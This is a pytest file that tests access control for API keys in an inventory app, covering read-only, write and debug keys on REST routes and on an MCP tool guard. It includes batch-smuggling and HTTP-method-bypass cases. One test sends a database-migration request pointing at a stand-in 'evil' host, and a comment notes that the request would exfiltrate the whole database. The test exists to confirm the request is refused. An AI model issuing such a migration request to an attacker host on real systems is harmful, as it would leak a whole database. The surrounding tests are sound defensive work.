"""Read-only vs read-write API-key access class.

A `read` key: REST mutating methods → 403; MCP write-tools → 403; reads still work.
A `write` key (and non-token JWT/ingress identities) is unaffected.
"""
import asyncio
import json

import pytest

import edibl_mcp
from app.auth import _default_user
from app.extensions import db
from app.models import ApiToken, TOKEN_ACCESS, generate_raw_token, hash_token


def _key(app, scope="full", access="write"):
    raw = generate_raw_token()
    with app.app_context():
        u = _default_user()
        db.session.add(ApiToken(name=f"k-{scope}-{access}", scope=scope, access=access,
                                token_hash=hash_token(raw), hint=raw[:9],
                                user_id=u.id, group_id=u.group_id))
        db.session.commit()
    return raw


def _bearer(raw):
    return {"Authorization": f"Bearer {raw}"}


# --- REST enforcement (the login_required/owner_required choke point) ----------

def test_read_only_key_allows_get(client, app):
    raw = _key(app, "full", "read")
    assert client.get("/api/v1/stock", headers=_bearer(raw)).status_code == 200


def test_read_only_key_blocks_post(client, app):
    raw = _key(app, "full", "read")
    r = client.post("/api/v1/stock", json={}, headers=_bearer(raw))
    assert r.status_code == 403


def test_write_key_allows_post(client, app):
    raw = _key(app, "full", "write")
    r = client.post("/api/v1/stock", json={}, headers=_bearer(raw))
    assert r.status_code != 403   # 400/422/201 — anything but forbidden


def test_jwt_user_can_still_write(auth_client):
    # A logged-in (non-token) user has no token_access → defaults to write.
    r = auth_client.post("/api/v1/stock", json={})
    assert r.status_code != 403


def test_read_only_key_blocks_instance_admin_write(client, app):
    # The instance-admin decorator is a 3rd choke point; a read-only key must NOT be
    # able to POST /migrate/postgres (which would exfiltrate the whole DB to a
    # caller-supplied host). The default user owns the primary group (instance admin).
    raw = _key(app, "full", "read")
    r = client.post("/api/v1/migrate/postgres",
                    json={"targetUrl": "postgresql+psycopg://x:y@evil/db"},
                    headers=_bearer(raw))
    assert r.status_code == 403


def test_create_token_rejects_bad_access(auth_client):
    r = auth_client.post("/api/v1/tokens", json={"name": "x", "access": "bogus"})
    assert r.status_code == 400


def test_create_token_defaults_to_write(auth_client):
    r = auth_client.post("/api/v1/tokens", json={"name": "x"})
    assert r.status_code == 201 and r.get_json()["access"] == "write"


# --- MCP guard enforcement (allowlist on tools/call) ---------------------------

def _run_guard(app, monkeypatch, raw, body_obj, method="POST"):
    monkeypatch.setattr(edibl_mcp, "_app", app)
    called = {"v": False}

    async def downstream(scope, receive, send):
        called["v"] = True
        await send({"type": "http.response.start", "status": 200, "headers": []})
        await send({"type": "http.response.body", "body": b"ok"})

    guard = edibl_mcp._guard(downstream, "")
    sent = []
    body = json.dumps(body_obj).encode()

    async def receive():
        return {"type": "http.request", "body": body, "more_body": False}

    async def send(msg):
        sent.append(msg)

    # A real request carries the mounted message path; the guard keys off it
    # (deliberately not off the HTTP method — Starlette's Mount does not filter
    # by method, so a PUT reaches the tool just like a POST).
    scope = {"type": "http", "method": method, "path": "/messages/",
             "headers": ([(b"authorization", f"Bearer {raw}".encode())] if raw else [])}
    asyncio.run(guard(scope, receive, send))
    status = next((m["status"] for m in sent if m["type"] == "http.response.start"), None)
    return status, called["v"]


def test_mcp_read_key_blocks_write_tool(app, monkeypatch):
    raw = _key(app, "mcp", "read")
    status, called = _run_guard(app, monkeypatch, raw,
                                {"method": "tools/call", "params": {"name": "add_stock"}})
    assert status == 403 and called is False


def test_mcp_read_key_allows_read_tool(app, monkeypatch):
    raw = _key(app, "mcp", "read")
    _status, called = _run_guard(app, monkeypatch, raw,
                                 {"method": "tools/call", "params": {"name": "do_i_have"}})
    assert called is True


def test_mcp_read_key_allows_tools_list(app, monkeypatch):
    raw = _key(app, "mcp", "read")
    _status, called = _run_guard(app, monkeypatch, raw, {"method": "tools/list"})
    assert called is True


def test_mcp_write_key_allows_write_tool(app, monkeypatch):
    raw = _key(app, "mcp", "write")
    _status, called = _run_guard(app, monkeypatch, raw,
                                 {"method": "tools/call", "params": {"name": "add_stock"}})
    assert called is True


def test_mcp_read_key_denies_unknown_tool(app, monkeypatch):
    # Fail-safe: a tool not on the READ allowlist (incl. unknown) is refused.
    raw = _key(app, "mcp", "read")
    status, called = _run_guard(app, monkeypatch, raw,
                                {"method": "tools/call", "params": {"name": "no_such_tool"}})
    assert status == 403 and called is False


def test_access_choices():
    assert TOKEN_ACCESS == ("write", "read")


# ---- The debug scope --------------------------------------------------------
#
# A debug key reads this instance's own logs, which carry sign-in emails and
# tracebacks that can include a database password. It is therefore a separate
# key class: denied at REST, denied on the domain tools, and the debug tools are
# denied to every other key on every network.

def test_debug_key_may_call_a_debug_tool(app, monkeypatch):
    raw = _key(app, "debug", "read")

    status, called = _run_guard(app, monkeypatch, raw,
                                {"method": "tools/call",
                                 "params": {"name": "debug_recent_logs"}})

    assert status == 200 and called is True


def test_debug_key_may_not_call_a_domain_tool(app, monkeypatch):
    raw = _key(app, "debug", "read")

    status, called = _run_guard(app, monkeypatch, raw,
                                {"method": "tools/call", "params": {"name": "add_stock"}})

    assert status == 403 and called is False


@pytest.mark.parametrize("scope", ["full", "mcp"])
def test_a_normal_key_may_not_call_a_debug_tool(app, monkeypatch, scope):
    """Least privilege in both directions — otherwise any Assist key could read
    the logs and 'debug only' would be a lie."""
    raw = _key(app, scope, "write")

    status, called = _run_guard(app, monkeypatch, raw,
                                {"method": "tools/call",
                                 "params": {"name": "debug_recent_logs"}})

    assert status == 403 and called is False


def test_an_unauthenticated_caller_may_not_call_a_debug_tool(app, monkeypatch):
    status, called = _run_guard(app, monkeypatch, "",
                                {"method": "tools/call",
                                 "params": {"name": "debug_recent_logs"}})

    assert status == 403 and called is False


def test_a_batch_cannot_smuggle_a_domain_tool_past_a_debug_key(app, monkeypatch):
    """JSON-RPC batches are checked element-wise."""
    raw = _key(app, "debug", "read")

    status, called = _run_guard(app, monkeypatch, raw, [
        {"method": "tools/call", "params": {"name": "debug_recent_logs"}},
        {"method": "tools/call", "params": {"name": "add_stock"}},
    ])

    assert status == 403 and called is False


def test_a_debug_key_is_rejected_at_the_rest_api(app, client):
    raw = _key(app, "debug", "read")

    client.environ_base["HTTP_AUTHORIZATION"] = f"Bearer {raw}"

    assert client.get("/api/v1/products").status_code == 401


# ---- The method-bypass blocker ---------------------------------------------
#
# FastMCP mounts the message endpoint with Starlette's Mount, which matches on
# PATH ONLY, and handle_post_message never checks the method — so PUT/GET/DELETE
# are processed exactly like POST. Gating the guard on method == "POST" meant it
# saw no tool names and applied no rule at all.

@pytest.mark.parametrize("method", ["PUT", "GET", "DELETE"])
def test_a_debug_tool_cannot_be_reached_with_a_non_post_method(app, monkeypatch, method):
    status, called = _run_guard(app, monkeypatch, "",
                                {"method": "tools/call",
                                 "params": {"name": "debug_recent_logs"}},
                                method=method)

    assert status == 403 and called is False


def test_a_debug_key_cannot_reach_a_domain_tool_with_a_non_post_method(app, monkeypatch):
    raw = _key(app, "debug", "read")

    status, called = _run_guard(app, monkeypatch, raw,
                                {"method": "tools/call", "params": {"name": "add_stock"}},
                                method="PUT")

    assert status == 403 and called is False


def test_a_malformed_params_list_does_not_500(app, monkeypatch):
    """`params` may legitimately be a list; .get on it raised."""
    status, called = _run_guard(app, monkeypatch, "",
                                {"method": "tools/call", "params": []})

    assert status in (200, 401, 403)
